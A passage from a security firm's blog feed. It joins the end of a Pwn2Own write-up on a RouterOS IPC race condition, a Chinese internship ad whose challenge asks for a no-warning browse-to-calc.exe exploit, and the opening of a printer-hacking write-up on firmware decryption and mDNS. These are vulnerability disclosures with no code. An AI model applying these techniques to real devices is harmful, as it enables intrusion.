&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-root-cause-of-race-condition&quot;&gt;The Root Cause of Race Condition&lt;/h3&gt;

&lt;p&gt;The problem is actually in the implementation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt;, where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt; to send a nova message. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt; is non-blocking, meaning that the remote object in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; doesn’t immediately know what id of a remote object corresponds to in the resolver.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If our second packet arrives too soon, so that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; doesn’t know what the remote object’s id is, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; can’t delete these objects in the first place, it can only mark them as destroyed for soft deletion, which results in a race condition.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s try to understand the whole process step by step:&lt;/p&gt;

&lt;p&gt;First, since both processes are single thread, we can assume that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; are in their first loop. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; receives an RA from the WAN with only one DNS address, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; sends a request for creating a remote object to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the same time, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; will set a timer when it receives the first request, because in the IPC mechanism, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; has no way of knowing how many &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; requests belong to the same group, so it simply sets a timer , and sends out a notification when the time is up. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; should reply with a nova message as a response, informing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; of the id of the remote object that has just been added, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; will register a corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; to handle this request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, if the second RA packet is delivered so fast that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; hasn’t sent the response back yet, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; can only mark the old DNS remote object as destroyed for soft deletion first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; proceeds to create a new DNS remote object for the RDNSS field in the second RA packet received, but since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; hasn’t finished the first iteration yet, this new request stays in the socket until the next iteration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going back to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;, the first iteration ends by passing back an id to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; will update the remote object based on the id it gets. But since the corresponding remote object has been marked for deletion, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; will delete the object instead of updating the object id.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; deletes the remote object saved in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;, it will send a delete object message to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;, informing it that the corresponding remote object is no longer in use and has to be deleted, but the request will still be stuck in the socket waiting to be processed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; then proceeds to the second iteration, where it gets a request from the socket to create a remote object for the second RA.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At this point, the previously set timer expires and the resolver calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::sendChanges&lt;/code&gt; to notify all subscribers what DNSs the resolver now knows about, since object 1 has not been deleted yet, so the resolver pushes the DNS that was created by the two requests. The DNS created by the two requests will be pushed out.&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; receives this information, it immediately constructs a RA packet to broadcast over the LAN, and the results of the two requests are mixed together, which is why our attack only succeeds on MacOS in the first place.&lt;/p&gt;

&lt;p&gt;The race condition itself sounds hard to be triggered (it won’t be triggered if the delete request is processed before the timer), but this is because the whole process has been greatly simplified for ease of explanation, and in fact, as long as the time between the arrival of the two packets is short enough, the race will be successful.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;summary-1&quot;&gt;Summary&lt;/h3&gt;

&lt;p&gt;Through the above analysis, we found a pattern of race conditions in the remote object mechanism of RouterOS:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Use non-blocking methods to create/delete the remote object&lt;/li&gt;
  &lt;li&gt;Subscribe to the remote object&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Because it is possible to mix the results of two requests into a single response, this could possibly be used to bypass some security checks. If we can find such a vulnerability, it could be used to participate in the router category.&lt;/p&gt;

&lt;p&gt;In the end, we were pressed for time and we didn’t find any exploitable vulnerabilities through the race condition.&lt;/p&gt;

&lt;p&gt;And not only that, we realized that the exploit that we had tested hundreds of times over the past few months still had some issues, and we still couldn’t get it to work three hours before the registration deadline. We kept updating the exploit and the white paper we were going to submit, and it was done until half an hour before the deadline (4:00 AM deadline).&lt;/p&gt;

&lt;p&gt;But luckily, we were able to complete the attack with only one attempt at Pwn2Own, becoming the first team in history to complete the new category of SOHO SMASHUP:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We earned 10 Master of Pwn points and $100,000 by this category, and at the end of the tournament, DEVCORE was crowned the winner with 18.5 Master of Pwn points.
&lt;img src=&quot;/assets/img/blog/20240524/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In addition to receiving the Master of Pwn title, trophy, and jacket, the organizers will also send us one of each of the devices we hacked.&lt;/p&gt;

&lt;p&gt;(We can’t fit all of them into a picture)
&lt;img src=&quot;/assets/img/blog/20240524/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this study, we have explored RouterOS in depth and revealed a security vulnerability that has been hidden in RouterOS for nine years. In addition, we found a design pattern in IPC that leads to a race condition. Meanwhile, we also open-source the tools used in the research at https://github.com/terrynini/routeros-tools for your reference.&lt;/p&gt;

&lt;p&gt;Through this paper, DEVCORE hopes to share our discoveries and experiences to help white hat hackers gain a deeper understanding of RouterOS and make it more understandable.&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en/</link>
                <guid>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en</guid>
                <pubDate>Fri, 24 May 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2024 第五屆實習生計畫</title>
                <description>&lt;p&gt;DEVCORE 創立迄今已逾十年，持續專注於提供主動式資安服務，並致力尋找各種安全風險及漏洞，讓世界變得更安全。為了持續尋找更多擁有相同理念的資安新銳、協助學生建構正確資安意識及技能，我們成立了「戴夫寇爾全國資訊安全獎學金」，2022 年初也開始舉辦首屆實習生計畫，目前為止成果頗豐、超乎預期，第四屆實習生計畫也將於今年 1 月底告一段落。我們很榮幸地宣佈，第五屆實習生計畫即將登場，若您期待加入我們、精進資安技能，煩請詳閱下列資訊後來信報名！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;實習內容&quot;&gt;實習內容&lt;/h3&gt;

&lt;p&gt;本次實習分為 Binary 及 Web 兩個組別，主要內容如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
以研究為主，在與導師確定研究標的後，分析目標架構、進行逆向工程或程式碼審查。藉由這個過程訓練自己的思路，找出可能的攻擊面與潛在的弱點。另外也會讓大家嘗試分析及寫過往漏洞的 Exploit，理解過去漏洞都出現在哪，體驗真實世界的漏洞都是如何利用。
    &lt;ul&gt;
      &lt;li&gt;漏洞挖掘及研究 70 %&lt;/li&gt;
      &lt;li&gt;1-day 開發 (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
導師會與學生討論並確定一個以學生的期望為主的實習目標，並在過程輔導成長以完成目標，內容可以是深入研究近年常見新型態漏洞、攻擊手法、開源軟體，或是程式語言生態系的常見弱點，亦或是展現你的技術力以開發與紅隊相關的工具。
    &lt;ul&gt;
      &lt;li&gt;漏洞、攻擊手法或開發工具研究 90%&lt;/li&gt;
      &lt;li&gt;成果報告與準備 10%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;公司地點&quot;&gt;公司地點&lt;/h3&gt;

&lt;p&gt;台北市松山區八德路三段 32 號 13 樓&lt;/p&gt;

&lt;h3 id=&quot;實習時間&quot;&gt;實習時間&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2024 年 3 月開始到 2024 年 7 月底，共 5 個月。&lt;/li&gt;
  &lt;li&gt;每週工作兩天，工作時間為 10:00 – 18:00
    &lt;ul&gt;
      &lt;li&gt;每週固定一天下午 14:00 - 18:00 必須到公司討論進度
        &lt;ul&gt;
          &lt;li&gt;如果居住雙北外可彈性調整(但須每個組別統一)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;其餘時間皆為遠端作業&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;招募對象&quot;&gt;招募對象&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;具有一定程度資安背景的學生，且可每週工作兩天&lt;/li&gt;
  &lt;li&gt;此外並無其他招募限制，歷屆實習生可重複應徵&lt;/li&gt;
  &lt;li&gt;對資格有任何疑慮，歡迎來信詢問&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;預計招收名額&quot;&gt;預計招收名額&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary 組：2~3 人&lt;/li&gt;
  &lt;li&gt;Web 組：2~3 人&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;薪資待遇&quot;&gt;薪資待遇&lt;/h3&gt;

&lt;p&gt;每月新台幣 16,000 元&lt;/p&gt;

&lt;h2 id=&quot;招募條件資格與流程&quot;&gt;招募條件資格與流程&lt;/h2&gt;

&lt;h3 id=&quot;實習條件要求&quot;&gt;實習條件要求&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;基本逆向工程及除錯能力
    &lt;ul&gt;
      &lt;li&gt;能看懂組合語言並瞭解基本 Debugger 使用技巧&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;基本漏洞利用能力
    &lt;ul&gt;
      &lt;li&gt;須知道 Stack overflow、ROP 等相關利用技巧&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;基本 Scripting Language 開發能力
    &lt;ul&gt;
      &lt;li&gt;Python、Ruby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備分析大型 Open Source 專案能力
    &lt;ul&gt;
      &lt;li&gt;以 C/C++ 為主&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備基礎作業系統知識
    &lt;ul&gt;
      &lt;li&gt;例如知道 Virtual Address 與 Physical Address 的概念&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;知道怎樣寫的程式碼會有問題
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;…&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備研究熱誠，習慣了解技術本質&lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;CTF 比賽經驗&lt;/li&gt;
      &lt;li&gt;pwnable.tw 成績&lt;/li&gt;
      &lt;li&gt;樂於分享技術
        &lt;ul&gt;
          &lt;li&gt;有公開的技術 blog/slide、Write-ups 或是演講&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;精通 IDA Pro 或 Ghidra&lt;/li&gt;
      &lt;li&gt;有寫過 1-day 利用程式&lt;/li&gt;
      &lt;li&gt;具備下列其中之一經驗
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;熟悉 OWASP Web Top 10。&lt;/li&gt;
  &lt;li&gt;理解 PortSwigger Web Security Academy 中所有的安全議題或已完成所有 Lab。
    &lt;ul&gt;
      &lt;li&gt;參考連結：https://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;理解計算機網路的基本概念。&lt;/li&gt;
  &lt;li&gt;熟悉 Command Line 操作，包含 Unix-like 和 Windows 作業系統的常見或內建系統指令工具。&lt;/li&gt;
  &lt;li&gt;熟悉任一種網頁程式語言（如：PHP、ASP.NET、JSP），具備可以建立完整網頁服務的能力。&lt;/li&gt;
  &lt;li&gt;熟悉任一種 Scripting Language（如：Shell Script、Python、Ruby），並能使用腳本輔以研究。&lt;/li&gt;
  &lt;li&gt;具備除錯能力，能善用 Debugger 追蹤程式流程、能重現並收斂問題。&lt;/li&gt;
  &lt;li&gt;具備可以建置、設定常見網頁伺服器（如：Nginx、Apache）及作業系統（如：Linux）的能力。&lt;/li&gt;
  &lt;li&gt;具備追根究柢的精神。&lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;曾經獨立挖掘過 0-day 漏洞。&lt;/li&gt;
      &lt;li&gt;曾經獨立分析過已知漏洞並能撰寫 1-day exploit。&lt;/li&gt;
      &lt;li&gt;曾經於 CTF 比賽中擔任出題者並建置過題目。&lt;/li&gt;
      &lt;li&gt;擁有 OSCP 證照或同等能力之證照。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;應徵流程&quot;&gt;應徵流程&lt;/h3&gt;

&lt;p&gt;本次甄選一共分為二個階段：&lt;/p&gt;

&lt;h4 id=&quot;第一階段書面審查&quot;&gt;第一階段：書面審查&lt;/h4&gt;

&lt;p&gt;第一階段為書面審查，會需要審查下列兩個項目&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;履歷內容&lt;/li&gt;
  &lt;li&gt;簡答題答案
    &lt;ul&gt;
      &lt;li&gt;題目 1：請提出三個，你印象最深刻或感到有趣、於西元 2021 ~ 2023 年間公開的真實漏洞或攻擊鏈案例，並依自己的理解簡述說明各個漏洞的成因、利用條件和可以造成的影響。&lt;/li&gt;
      &lt;li&gt;題目 2：實習期間想要研究的主題，請提出三個可能選擇的明確主題，並簡單說明提出的理由或想完成的內容，例如：
        &lt;ul&gt;
          &lt;li&gt;研究◯◯開源軟體，找到可 RCE 的重大風險弱點。&lt;/li&gt;
          &lt;li&gt;研究 AD CS 的攻擊手法，嘗試挖掘新的攻擊可能性或向量。&lt;/li&gt;
          &lt;li&gt;研究常見的路由器，目標包括：AA-123 路由器、BB-456 無線路由器。&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;題目 3（應徵 Binary 組需回答）：該&lt;a href=&quot;/assets/files/recruit/binary/2024_Intern_Challenge.py&quot;&gt;程式&lt;/a&gt;為一個 Local Server，可透過瀏覽網頁與之互動，該 Server 跑在 Windows 11 的電腦上。
        &lt;ul&gt;
          &lt;li&gt;請分析上述所提供的 Server，並利用其中的功能，讓使用者瀏覽網頁後，可直接在 Windows 11 上跳出 calc.exe，另外也請盡量滿足下列條件
            &lt;ul&gt;
              &lt;li&gt;不可跳&lt;strong&gt;任何&lt;/strong&gt;警告視窗。&lt;/li&gt;
              &lt;li&gt;使用者只要瀏覽網頁即可觸發不會有額外操作。&lt;/li&gt;
              &lt;li&gt;瀏覽器限制為 Chrome 或是 MS Edge&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;請務必寫下解題過程，並交 write-up，請盡你所能來解題，即使最後沒有成功，也請寫下您所嘗試過的方法及思路，本測驗將會以 write-up 為主要依據。&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本階段收件截止時間為 &lt;strong&gt;2024/01/28 23:59&lt;/strong&gt;，我們會根據您的履歷及題目所回答的內容來決定是否有通過第一階段，我們會在 10 個&lt;strong&gt;工作天&lt;/strong&gt;內回覆。&lt;/p&gt;

&lt;h4 id=&quot;第二階段面試&quot;&gt;第二階段：面試&lt;/h4&gt;
&lt;p&gt;此階段為 30~120 分鐘（依照組別需求而定，會另行通知）的面試，會有 2~3 位資深夥伴參與，評估您是否具備本次實習所需的技術能力與人格特質。&lt;/p&gt;

&lt;h4 id=&quot;時間軸&quot;&gt;時間軸&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2024/01/05 - 2024/01/28 公開招募，書審截止&lt;/li&gt;
  &lt;li&gt;2024/01/29 - 2024/02/22 面試&lt;/li&gt;
  &lt;li&gt;2024/02/26 前回應結果，早面試會早收到結果&lt;/li&gt;
  &lt;li&gt;2024/03/04 第五屆實習計畫於當週開始&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;報名方式&quot;&gt;報名方式&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;請將您的&lt;strong&gt;履歷&lt;/strong&gt;及&lt;strong&gt;題目答案&lt;/strong&gt;以 PDF 格式寄到 recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;履歷格式請參考範例示意（&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;）並轉成 PDF。若您有自信，也可以自由發揮最能呈現您能力的履歷。&lt;/li&gt;
      &lt;li&gt;請於 &lt;strong&gt;2024/01/28 23:59&lt;/strong&gt; 前寄出（如果名額已滿則視情況提早結束）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;信件標題格式：[應徵] 職位 您的姓名（範例：[應徵] Web 組實習生 王小美）&lt;/li&gt;
  &lt;li&gt;履歷內容請務必控制在三頁以內，至少需包含以下內容：
    &lt;ul&gt;
      &lt;li&gt;基本資料&lt;/li&gt;
      &lt;li&gt;學歷&lt;/li&gt;
      &lt;li&gt;實習經歷&lt;/li&gt;
      &lt;li&gt;社群活動經歷&lt;/li&gt;
      &lt;li&gt;特殊事蹟&lt;/li&gt;
      &lt;li&gt;過去對於資安的相關研究&lt;/li&gt;
      &lt;li&gt;MBTI 職業性格測試結果（&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;測試網頁&lt;/a&gt;）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;若有應徵相關問題，請一律使用 Email 聯繫，如造成您的不便請見諒，我們感謝您的來信，並期待您的加入！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/01/05/5nd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2024/01/05/5nd-internship-program-recruit</guid>
                <pubDate>Fri, 05 Jan 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part II</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hacking Printers at Pwn2Own Toronto 2022&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;延續&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;之前&lt;/a&gt;的研究，去年我們也在 Canon 的其他型號中，找到了 Pre-auth RCE 漏洞 &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-553/&quot;&gt;(CVE-2023-0853&lt;/a&gt;、&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-554/&quot;&gt;CVE-2023-0854&lt;/a&gt;)，同時 HP 的印表機也有找到 Pre-auth RCE 的漏洞，然而最終與其他隊伍撞洞。我們將在本文講述我們在 Pwn2own Toronto 中所使用的 Canon 及 &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-35178&quot;&gt;HP 漏洞&lt;/a&gt;的細節，以及我們的利用方式。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pwn2Own Toronto 2022 Target&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Target&lt;/th&gt;
      &lt;th&gt;Price&lt;/th&gt;
      &lt;th&gt;Master of Pwn Points&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;HP Collor LaserJet Pro M479fdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Lexmark MC3224i&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Canon imageCLASS MF743Cdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;
&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;

&lt;p&gt;與 2021 年相同，可參考&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;前述&lt;/a&gt;部分，本次版本為 v11.04 。&lt;/p&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;

&lt;p&gt;Firmware 本身可以從 HP 的 Firmware &lt;a href=&quot;https://ftp.ext.hp.com/pub/networking/software/pfirmware/pfirmware.glf&quot;&gt;網站&lt;/a&gt; 中取得，但與 2021 年不同，並&lt;strong&gt;無法&lt;/strong&gt;直接用 binwalk 解出，這邊的 Firmware 是透過 AES 加密的，從現有的資訊中不太好直接解開。&lt;/p&gt;

&lt;p&gt;而這邊起初想法是找相同系列的 Fimware 看看是否有未加密版本，然而 HP 官方的 Firmware 中，並沒有符合條件的 Firmware，原本打算拆印表機想辦法 Dump firmware，但我們後來在 Google 的過程中，找到了舊版的 mirror 站，而該網站有開 index of，我們可以從中獲得所有在 mirror 網站中的 Firmware。&lt;/p&gt;

&lt;p&gt;但這邊問題是該 Mirror 網站只有 mirror 到 2016 並沒有最新版本的資訊，不過後來可以從網站資訊中，獲得官方的目錄結構，從而取得相同系列的但沒有加密的 Firmware。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在分析過後，我們從 Firmware 中找到 fwupd 中有解密相關資訊，透過逆向可以知道加密方法及 Key，進而解出目標版本的 Firmware。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;hp-collor-laserjet-pro-m479fdw&quot;&gt;HP Collor LaserJet Pro M479fdw&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;OS - Linux Base&lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vulnerability--exploitation&quot;&gt;Vulnerability &amp;amp; Exploitation&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;mdns-cve-2023-0853&quot;&gt;mDNS (CVE-2023-0853)&lt;/h4&gt;
&lt;p&gt;mDNS 協定主要提供了區網中的域名解析功能，並且不需要有 Name Server 的介入，常用於 Apple 及 IoT 設備中。&lt;/p&gt;

&lt;p&gt;而在 Canon 中，預設情況下，也提供了相同的功能，方便使用者尋找區網中的印表機。&lt;/p&gt;

&lt;p&gt;該協定主要以 DNS 為基礎，基本上 mDNS 也大多建立在 DNS 封包格式 &lt;a href=&quot;https://www.ietf.org/rfc/rfc1035.txt&quot;&gt;(RFC1035)&lt;/a&gt; 上，格式如下：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The packet format:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    +---------------------+
    |        Header       |
    +---------------------+
    |       Question      | the question for the name server
    +---------------------+
    |        Answer       | RRs answering the question
    +---------------------+
    |      Authority      | RRs pointing toward an authority
    +---------------------+
    |      Additional     | RRs holding additional information
    +---------------------+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;The header contains the following fields:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
